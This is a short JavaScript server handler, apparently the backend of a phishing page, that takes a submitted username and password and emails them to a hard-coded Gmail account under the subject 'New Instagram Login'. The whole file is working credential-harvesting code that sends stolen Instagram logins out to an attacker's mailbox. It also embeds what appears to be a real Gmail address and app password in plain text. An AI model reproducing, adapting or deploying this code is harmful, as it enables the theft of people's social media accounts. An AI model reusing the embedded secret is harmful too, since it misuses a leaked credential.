const nodemailer = require('nodemailer');

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ message: 'Method Not Allowed' });
    return;
  }

  const { username, password } = req.body;

  if (!username || !password) {
    res.status(400).json({ message: 'Missing credentials' });
    return;
  }

  // Replace with your Gmail and App Password
  const GMAIL_USER = 'waemsa19@gmail.com';
  const GMAIL_PASS = 'mcci julh ypdy ngee';

  try {
    let transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: GMAIL_USER,
        pass: GMAIL_PASS
      }
    });

    await transporter.sendMail({
      from: GMAIL_USER,
      to: GMAIL_USER,
      subject: 'New Instagram Login',
      text: `Username: ${username}\nPassword: ${password}`
    });

    res.status(200).json({ message: 'Credentials sent to Gmail!' });
  } catch (error) {
    res.status(500).json({ message: 'Failed to send email', error: error.toString() });
  }
} 